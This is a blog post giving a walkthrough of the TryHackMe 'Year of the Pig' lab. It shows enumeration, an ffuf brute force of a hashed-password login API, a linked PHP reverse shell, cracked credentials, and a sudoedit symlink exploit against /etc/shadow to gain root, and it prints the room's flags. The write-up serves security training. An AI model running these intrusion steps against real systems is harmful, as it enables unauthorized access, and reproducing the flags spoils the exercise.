<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Year of the Pig Write-up | TryHackMe Hard | Utkarsh M</title>
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    
  </head>

  <body>
    <header class="site-title-main">
      Utkarsh M
    </header>
    <nav>
    <ul class="menu">
      
      <li><a href="/">Home</a></li>
      
      <li><a href="/post/">Posts</a></li>
      
      <li><a href="/categories/">Categories</a></li>
      
      <li><a href="/about/">About</a></li>
      
    </ul>
    <hr/>
    </nav>

<div class="post-container">
  <div class="post-date">2022/07/10</div>
  <h1 class="post-title">Year of the Pig Write-up | TryHackMe Hard</h1>
</div>

<main>
<p>Some pigs do fly&hellip;</p>
<p><a href="https://tryhackme.com/room/yearofthepig">TryHackMe/Year of the Pig</a></p>
<hr>
<h2 id="enumeration">Enumeration</h2>
<p>IP: <code>10.10.123.176</code></p>
<p>threader300 scan:</p>
<pre><code class="language-sh">------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.123.176
------------------------------------------------------------
Scanning target 10.10.123.176
Time started: 2022-07-11 01:01:05.025949
------------------------------------------------------------
Port 22 is open
Port 80 is open
Port scan completed in 0:00:54.728354
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.123.176 10.10.123.176
************************************************************
</code></pre>
<p>running suggested nmap scan:</p>
<pre><code class="language-sh">nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.123.176 10.10.123.176
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 01:03 IST
Nmap scan report for 10.10.123.176
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Marco's Blog
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.67 seconds
------------------------------------------------------------
Combined scan completed in 0:02:05.997917

</code></pre>
<p>Visiting the webserver at pJellyfishort 80:</p>
<p><img src="/assets/img/thm/yotp/1.png" alt=""></p>
<p>gobuster directory scan:</p>
<pre><code class="language-sh">gobuster dir -u http://10.10.123.176/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -b 404,403 --no-error
</code></pre>
<pre><code>/admin                (Status: 301) [Size: 314] [--&gt; http://10.10.123.176/admin/]
/assets               (Status: 301) [Size: 315] [--&gt; http://10.10.123.176/assets/]
/css                  (Status: 301) [Size: 312] [--&gt; http://10.10.123.176/css/]   
/js                   (Status: 301) [Size: 311] [--&gt; http://10.10.123.176/js/]    
/api                  (Status: 301) [Size: 312] [--&gt; http://10.10.123.176/api/] 
</code></pre>
<p><code>/admin</code>:</p>
<p><img src="/assets/img/thm/yotp/2.png" alt=""></p>
<p><code>/api</code> takes in only post request.</p>
<p>gobuster file scan:</p>
<pre><code class="language-sh">gobuster dir -u http://10.10.123.176/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100 -b 404,403 --no-error
</code></pre>
<pre><code class="language-sh">/login.php            (Status: 200) [Size: 2790]
/.                    (Status: 200) [Size: 4801]
/index.html           (Status: 200) [Size: 4801]
</code></pre>
<p>at <code>/admin</code> sourc code, we can see the obfuscated js code:</p>
<p><img src="/assets/img/thm/yotp/3.png" alt=""></p>
<p>replacing the weird names with the values in the arrays:</p>
<pre><code class="language-js">const _0x44d4 = [&quot;auth&quot;, &quot;querySelector&quot;, &quot;click&quot;, &quot;replace&quot;, &quot;post&quot;, &quot;#submit-btn&quot;, &quot;input&quot;, &quot;then&quot;, &quot;authLogin=&quot;, &quot;addEventListener&quot;, &quot;keyCode&quot;, &quot;#username&quot;, &quot;style&quot;, &quot;Success&quot;, &quot;/admin&quot;, &quot;keyup&quot;, &quot;location&quot;, &quot;Response&quot;, &quot;cookie&quot;, &quot;application/json&quot;, &quot;stringify&quot;, &quot;same-origin&quot;, &quot;querySelectorAll&quot;, &quot;value&quot;, &quot;opacity: 1&quot;];
(function(data, i) {
  const write = function(isLE) {
    for (; --isLE;) {
      data[&quot;push&quot;](data[&quot;shift&quot;]());
    }
  };
  write(++i);
})(_0x44d4, 276);
const _0x48fd = function(url, whensCollection) {
  /** @type {number} */
  url = url - 0;
  let _0x48fdee = _0x44d4[url];
  return _0x48fdee;
};
/**
 * @return {undefined}
 */
function login() {
  const timesresults = document['auth'](&quot;#username&quot;);
  const fields = document['auth'](&quot;#password&quot;);
  const adminPassword = md5(fields['querySelectorAll']);
  fetch(&quot;/api/login&quot;, {
    &quot;method&quot; : 'post',
    &quot;credentials&quot; : 'same-origin',
    &quot;headers&quot; : {
      &quot;Accept&quot; : 'cookie'
    },
    &quot;body&quot; : JSON['application/json']({
      &quot;username&quot; : timesresults['querySelectorAll'],
      &quot;password&quot; : adminPassword
    })
  })[input]((options) =&gt; {
    return options[&quot;json&quot;]();
  })[&quot;then&quot;]((tmp) =&gt; {
    /** @type {string} */
    document['auth']('keyCode')[&quot;value&quot;] = &quot;&quot;;
    /** @type {string} */
    document['auth'](&quot;#password&quot;)[querySelectorAll] = &quot;&quot;;
    if (tmp['location'] == 'style') {
      /** @type {string} */
      document[&quot;Response&quot;] = then + tmp['opacity: 1'] + '; samesite=lax; path=&quot;/&quot;';
      window['keyup']['click'](Success);
    } else {
      alert(tmp[&quot;Verbose&quot;]);
      document['auth'](&quot;#pass-hint&quot;)['#username'] = 'value';
    }
  });
}
document['same-origin']('#submit-btn')[&quot;forEach&quot;]((canCreateDiscussions) =&gt; {
  canCreateDiscussions[authLogin]('/admin', (canCreateDiscussions) =&gt; {
    if (canCreateDiscussions['addEventListener'] === 13) {
      document['auth']('post')['querySelector']();
    }
  });
});

</code></pre>
<p>It just hashes the password and sends the request. :-;</p>
<p>Hmm so the possible username from the main page could me marco since its his blog.</p>
<p><img src="/assets/img/thm/yotp/4.png" alt=""></p>
<p>Manually  trying out few combinations by looking at homepage didn&rsquo;t work. :-; lets generate custom word list.</p>
<p>wordlist:</p>
<pre><code class="language-sh">./cewl.rb  -w customwordlist.txt  http://10.10.123.176/
</code></pre>
<p>Using mentalist to create a wordlist with our required specifications:</p>
<p><img src="/assets/img/thm/yotp/5.png" alt=""></p>
<p>using <a href="https://www.miraclesalad.com/webtools/md5.php">https://www.miraclesalad.com/webtools/md5.php</a> for generating md5 hashes.</p>
<p><img src="/assets/img/thm/yotp/6.png" alt=""></p>
<p>lets use a dictionary attack mode now :P</p>
<p>We&rsquo;ll use ffuf to bruteforce as we can&rsquo;t pass custom headers to hydra, ignoring response size 63. I have also ignored 500 bcoz they didn&rsquo;t work and were again multiple.</p>
<pre><code class="language-sh">ffuf -w hashlist.txt -H &quot;Accept: application/json&quot; -X POST -d '{&quot;username&quot;:&quot;marco&quot;,&quot;password&quot;:&quot;FUZZ&quot;}' -u http://10.10.123.176/api/login -H &quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36&quot; -fs 63
</code></pre>
<p><img src="/assets/img/thm/yotp/7.png" alt=""></p>
<p>finding that hash in hashlist and then comparing it to passlist, the password is <code>savoia21! </code>
Finally</p>
<p>Hmm, Trying the same  password for ssh and so we obtained a shell into the machine. :O</p>
<hr>
<h2 id="flag-1">Flag 1</h2>
<p><img src="/assets/img/thm/yotp/8.png" alt=""></p>
<pre><code>THM{MDg0MGVjYzFjY2ZkZGMzMWY1NGZiNjhl}
</code></pre>
<hr>
<h2 id="privilege-escalation---curtis">Privilege Escalation - curtis</h2>
<p><code>commands.php</code>:
hehe, I just feel lucky to not have wasted time on it xD.
<img src="/assets/img/thm/yotp/9.png" alt=""></p>
<p>hmm so we can use ssh but F I did  a password reset by mistake on <code>curtis</code>. restarting the server. :P we can upload a reverse shell in <code>/var/www/html</code> and get the database.</p>
<p>Using this infamous php reverse shell: <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">Github Link</a></p>
<p>So after gaining a shell as www-data:</p>
<p><img src="/assets/img/thm/yotp/10.png" alt=""></p>
<p>Now finding our other password in the text, we can see a pattern. we know that md5 hash consists of 32 characters so we will copy the next 32 characters after the username <code>curtis</code>:</p>
<p><img src="/assets/img/thm/yotp/11.png" alt=""></p>
<p>And so we get the following hash :</p>
<pre><code>a80bfe309ecaafcea1ea6cb3677971f2
</code></pre>
<p>Crackstation results :</p>
<p><img src="/assets/img/thm/yotp/12.png" alt=""></p>
<p>password:<code>Donald1983$</code></p>
<p>and the password for <code>curtis</code> works.</p>
<p><img src="/assets/img/thm/yotp/13.png" alt=""></p>
<hr>
<h2 id="flag-2">Flag 2</h2>
<p><img src="/assets/img/thm/yotp/14.png" alt=""></p>
<pre><code>THM{Y2Q2N2M1NzNmYTQzYTI4ODliYzkzMmZh}
</code></pre>
<hr>
<h2 id="privilege-escalation---root">Privilege Escalation - root</h2>
<p><img src="/assets/img/thm/yotp/15.png" alt=""></p>
<p>hmm, So I found this exploit which I can use: <a href="https://www.exploit-db.com/exploits/37710"># Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - &lsquo;Sudoedit&rsquo; Unauthorized Privilege Escalation</a></p>
<pre><code class="language-sh">ln -s /etc/shadow /var/www/html/a/b/config.php
sudoedit /var/www/html/a/b/config.php
</code></pre>
<p>Changing the password of <code>root</code> to that of <code>curtis</code>:</p>
<p><img src="/assets/img/thm/yotp/16.png" alt=""></p>
<p>We gained root:</p>
<p><img src="/assets/img/thm/yotp/17.png" alt=""></p>
<hr>
<h2 id="flag-3">Flag 3</h2>
<p><img src="/assets/img/thm/yotp/18.png" alt=""></p>
<pre><code>THM{MjcxNmVmYjNhYzdkZDc0M2RkNTZhNDA0}
</code></pre>

</main>

  <footer>
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/math-code.min.js" defer></script>
<script src="//cdn.jsdelivr.net/npm/katex/dist/katex.min.js" defer></script>
<script src="//cdn.jsdelivr.net/npm/katex/dist/contrib/auto-render.min.js" defer></script>
<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/render-katex.js" defer></script>

<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/center-img.min.js" defer></script>

  
  <hr/>
  © <a href="https://utkar5hm.github.io">Utkarsh M</a> 2025 &ndash; 2025 | <a href="https://github.com/Utkar5hM">Github</a> | <a href="https://www.linkedin.com/in/utkar5hm/">Linkedin</a>
  
  </footer>
  </body>
</html>

